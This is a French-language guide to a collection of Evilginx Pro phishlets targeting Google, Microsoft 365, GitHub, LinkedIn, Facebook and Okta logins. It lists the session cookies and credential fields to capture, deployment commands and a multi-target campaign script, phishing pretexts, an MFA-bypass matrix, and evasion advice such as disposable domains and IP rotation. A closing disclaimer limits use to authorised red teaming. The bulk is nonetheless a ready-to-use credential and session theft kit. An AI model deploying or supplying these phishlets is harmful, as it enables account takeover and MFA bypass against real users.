# 🎯 COLLECTION COMPLÈTE DE PHISHLETS EVILGINX PRO

## 📦 Phishlets Disponibles

Tous les phishlets ont été générés dans `/tmp/` et sont prêts à l'emploi.

---

## 1️⃣ **GOOGLE / GMAIL** (`google-simple.yaml`)

### Informations

- **Domaine cible** : accounts.google.com
- **Services** : Gmail, Google Drive, Google Workspace
- **Difficulté** : ⭐⭐⭐ (Moyenne)

### Cookies capturés

- `SID`, `SSID`, `APISID`, `SAPISID`, `HSID`
- `__Secure-1PSID`, `__Secure-3PSID`

### Champs credentials

- **Username** : `Email`
- **Password** : `Passwd`

### Configuration rapide

```bash
phishlets push private/google-simple
phishlets set private/google-simple hostname accounts.votredomaine.com
phishlets enable private/google-simple
lures create private/google-simple /drive/document.pdf
```

### Notes importantes

- Google utilise une authentification en 2 étapes (email puis password)
- Nécessite Evilpuppet (Pro) pour contourner Google reCAPTCHA
- Tokens de session valides pendant plusieurs semaines

---

## 2️⃣ **MICROSOFT 365** (`microsoft365.yaml`)

### Informations

- **Domaine cible** : login.microsoftonline.com
- **Services** : Office 365, Azure AD, Teams, Outlook
- **Difficulté** : ⭐⭐⭐⭐ (Élevée)

### Cookies capturés

- `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `ESTSAUTHLIGHT`
- `SignInStateCookie`, `buid`

### Champs credentials

- **Username** : `login`
- **Password** : `passwd`

### Configuration rapide

```bash
phishlets push private/microsoft365
phishlets set private/microsoft365 hostname login.votredomaine.com
phishlets enable private/microsoft365
lures create private/microsoft365 /common/oauth2/authorize
```

### Notes importantes

- Supporte l'authentification fédérée (ADFS, Okta intégré)
- MFA très fréquent (Authenticator, SMS)
- Conditional Access peut bloquer selon l'IP/device
- Session tokens très sécurisés

### Variantes d'authentification

```yaml
# Outlook Web Access
path: '/owa/auth/logon.aspx'

# Azure Portal
path: '/azure/login'

# Teams
path: '/teams/login'
```

---

## 3️⃣ **GITHUB** (`github.yaml`)

### Informations

- **Domaine cible** : github.com
- **Services** : GitHub, GitHub Enterprise
- **Difficulté** : ⭐⭐⭐ (Moyenne)

### Cookies capturés

- `user_session`, `__Host-user_session_same_site`
- `logged_in`, `dotcom_user`, `_gh_sess`

### Champs credentials

- **Username** : `login`
- **Password** : `password`

### Configuration rapide

```bash
phishlets push private/github
phishlets set private/github hostname github.votredomaine.com
phishlets enable private/github
lures create private/github /login
```

### Notes importantes

- 2FA très courant (TOTP, SMS, Security Keys)
- GitHub envoie des notifications par email lors de nouvelles connexions
- Sessions valides pendant 2 semaines
- IP logging actif

### Cibles privilégiées

- Développeurs avec accès aux repos privés
- Maintainers de projets open source
- Utilisateurs avec PAT (Personal Access Tokens)

---

## 4️⃣ **LINKEDIN** (`linkedin.yaml`)

### Informations

- **Domaine cible** : www.linkedin.com
- **Services** : LinkedIn, LinkedIn Recruiter, Sales Navigator
- **Difficulté** : ⭐⭐⭐⭐ (Élevée)

### Cookies capturés

- `li_at` (token principal)
- `JSESSIONID`, `liap`, `bcookie`, `bscookie`

### Champs credentials

- **Username** : `session_key`
- **Password** : `session_password`

### Configuration rapide

```bash
phishlets push private/linkedin
phishlets set private/linkedin hostname www.votredomaine.com
phishlets enable private/linkedin
lures create private/linkedin /login
```

### Notes importantes

⚠️ **HAUTE DÉTECTION** : LinkedIn a des protections anti-phishing avancées

- Device fingerprinting sophistiqué
- Location-based verification
- Challenge-response fréquent (email/SMS)
- Blacklisting rapide des domaines suspects (<24h)

### Recommandations

- Utiliser des domaines jetables
- Rotation d'infrastructure obligatoire
- VPN/Proxy avec IP propre
- Limiter le volume de cibles

---

## 5️⃣ **FACEBOOK** (`facebook.yaml`)

### Informations

- **Domaine cible** : www.facebook.com
- **Services** : Facebook, Instagram (partiel), Messenger
- **Difficulté** : ⭐⭐⭐⭐⭐ (Très élevée)

### Cookies capturés

- `c_user` (User ID), `xs` (Session token)
- `datr` (Device token), `fr` (Facebook request)
- `sb`, `presence`, `wd`

### Champs credentials

- **Username** : `email`
- **Password** : `pass`

### Configuration rapide

```bash
phishlets push private/facebook
phishlets set private/facebook hostname www.votredomaine.com
phishlets enable private/facebook
lures create private/facebook /login
```

### Notes importantes

🚨 **DÉTECTION EXTRÊME** : Facebook a les protections les plus avancées

- Machine learning pour détection comportementale
- Device fingerprinting ultra-sophistiqué
- Blacklisting instantané (<1h)
- Legal action contre phishing actif

### Recommandations

⚠️ **NE PAS UTILISER EN PRODUCTION** sauf :

- Environnement de lab contrôlé
- Red team avec autorisation explicite
- Infrastructure dédiée et isolée

---

## 6️⃣ **OKTA** (`okta.yaml`)

### Informations

- **Domaine cible** : {tenant}.okta.com (variable)
- **Services** : Okta SSO, Okta Verify
- **Difficulté** : ⭐⭐⭐⭐ (Élevée)

### Cookies capturés

- `sid` (Session ID), `idx` (Identity token)
- `dt`, `DT` (Device Trust tokens)
- `JSESSIONID`

### Champs credentials

- **Username** : `username`
- **Password** : `password`

### Configuration rapide

```bash
# IMPORTANT : Remplacer {tenant} par le tenant cible
# Exemple : acme.okta.com → remplacer {tenant} par "acme"

phishlets push private/okta
phishlets set private/okta hostname acme.votredomaine.com
phishlets enable private/okta
lures create private/okta /login/login.htm
```

### Notes importantes

- Okta est un SSO : capture = accès à TOUTES les apps liées
- ThreatInsight (si activé) détecte le phishing
- MFA obligatoire dans la plupart des configurations
- Device Trust très restrictif

### Valeur élevée

- Un compte Okta = accès à dizaines d'applications corporate
- Cible privilégiée en red team
- Nécessite reconnaissance préalable du tenant

---

## 📊 COMPARAISON DES PLATEFORMES

| Plateforme    | Difficulté | Détection | MFA % | Valeur     | Recommandation        |
| ------------- | ---------- | --------- | ----- | ---------- | --------------------- |
| Google        | ⭐⭐⭐     | Moyenne   | 40%   | 🔥🔥🔥     | ✅ Recommandé         |
| Microsoft 365 | ⭐⭐⭐⭐   | Élevée    | 70%   | 🔥🔥🔥🔥   | ✅ Haute valeur       |
| GitHub        | ⭐⭐⭐     | Moyenne   | 60%   | 🔥🔥🔥     | ✅ Développeurs       |
| LinkedIn      | ⭐⭐⭐⭐   | Élevée    | 20%   | 🔥🔥       | ⚠️ Rotation IP        |
| Facebook      | ⭐⭐⭐⭐⭐ | Extrême   | 30%   | 🔥         | ❌ Lab seulement      |
| Okta          | ⭐⭐⭐⭐   | Élevée    | 90%   | 🔥🔥🔥🔥🔥 | ✅ SSO - Haute valeur |

---

## 🚀 DÉPLOIEMENT MULTI-PHISHLETS

### Scénario : Campagne multi-cibles

```bash
#!/bin/bash
# Script de déploiement multiple

# Configuration commune
DOMAIN="votredomaine.com"

# Déployer Google
phishlets push private/google-simple
phishlets set private/google-simple hostname accounts.$DOMAIN
phishlets enable private/google-simple

# Déployer Microsoft
phishlets push private/microsoft365
phishlets set private/microsoft365 hostname login.$DOMAIN
phishlets enable private/microsoft365

# Déployer GitHub
phishlets push private/github
phishlets set private/github hostname github.$DOMAIN
phishlets enable private/github

# Déployer Okta (adapter le tenant)
phishlets push private/okta
phishlets set private/okta hostname sso.$DOMAIN
phishlets enable private/okta

# Créer les lures
lures create private/google-simple /drive/doc.pdf
lures create private/microsoft365 /teams/invite
lures create private/github /notifications
lures create private/okta /app/UserHome

echo "✅ Tous les phishlets sont déployés !"
```

---

## 🎯 SÉLECTION PAR TYPE D'ENGAGEMENT

### Red Team Corporate

**Priorité** : Microsoft 365 + Okta

```bash
# Focus sur les accès corporate
phishlets: microsoft365, okta
pretext: "Verify your account", "Security alert"
```

### Red Team Développeurs

**Priorité** : GitHub + Google

```bash
# Focus sur les développeurs
phishlets: github, google
pretext: "Repository invite", "Code review request"
```

### Red Team Social Engineering

**Priorité** : LinkedIn + Microsoft

```bash
# Focus sur le réseau professionnel
phishlets: linkedin, microsoft365
pretext: "Job opportunity", "Connection request"
```

---

## 🛡️ MATRICE DE CONTOURNEMENT MFA

| Plateforme | MFA Type           | Contournement Evilginx | Difficulté     |
| ---------- | ------------------ | ---------------------- | -------------- |
| Google     | TOTP/SMS           | ✅ Session cookies     | Facile         |
| Google     | Security Key       | ⚠️ Evilpuppet requis   | Difficile      |
| Microsoft  | Authenticator Push | ✅ Session cookies     | Moyen          |
| Microsoft  | Conditional Access | ❌ Impossible          | -              |
| GitHub     | TOTP               | ✅ Session cookies     | Facile         |
| GitHub     | WebAuthn           | ⚠️ Evilpuppet requis   | Difficile      |
| LinkedIn   | SMS                | ✅ Session cookies     | Moyen          |
| Facebook   | TOTP/SMS           | ✅ Session cookies     | Moyen          |
| Okta       | Okta Verify        | ⚠️ Device Trust requis | Très difficile |

---

## 📝 CHECKLIST PAR PHISHLET

### Avant déploiement

```markdown
- [ ] Phishlet testé en local
- [ ] Domaine crédible enregistré
- [ ] DNS configuré (Cloudflare)
- [ ] Certificat TLS validé
- [ ] Lures testés
- [ ] Pretext préparé
- [ ] Timeline définie
- [ ] Exfiltration des données planifiée
- [ ] Clean-up procedure documentée
```

### Pendant l'engagement

```markdown
- [ ] Monitoring des sessions actif
- [ ] Logs en temps réel
- [ ] Rotation IP si détection
- [ ] Communication avec le client
- [ ] Documentation des captures
```

### Après l'engagement

```markdown
- [ ] Toutes les sessions exportées
- [ ] Serveur déployé
- [ ] Domaine désactivé
- [ ] Logs nettoyés
- [ ] Rapport de pentest rédigé
- [ ] Données sensibles supprimées
```

---

## 🔧 PERSONNALISATION DES PHISHLETS

### Ajouter un domaine CDN

```yaml
proxy_hosts:
  - phish_sub: "cdn"
    orig_sub: "cdn"
    domain: "example.com"
    session: false
    is_landing: false
```

### Ajouter un cookie

```yaml
auth_tokens:
  - domain: ".example.com"
    keys: ["new_cookie_name"]
```

### Modifier le path de login

```yaml
login:
  domain: "login.example.com"
  path: "/custom/login/path"
```

---

## 📞 SUPPORT & RESSOURCES

### Documentation

- **Evilginx Pro** : https://help.evilginx.com/pro
- **BREAKDEV Blog** : https://breakdev.org/

### Communauté

- **Discord BREAKDEV RED** : Phishlets communautaires actualisés
- **GitHub** : https://github.com/kgretzky/evilginx2

### Formation

- **Evilginx Mastery** : https://academy.breakdev.org/evilginx-mastery

---

## ⚠️ DISCLAIMER

```
Ces phishlets sont fournis à des fins de TESTS DE SÉCURITÉ AUTORISÉS uniquement.

✅ Usage autorisé :
   - Pentests avec contrat signé
   - Red team avec autorisation écrite
   - Environnements de lab/formation

❌ Usage interdit :
   - Phishing réel non autorisé
   - Vol de données
   - Activités criminelles

L'auteur décline toute responsabilité pour usage malveillant.
```

---

**🎣 Tous les phishlets sont prêts dans `/tmp/` !**

_Collection créée le 25 décembre 2025_
_Compatible Evilginx Pro 3.0+_
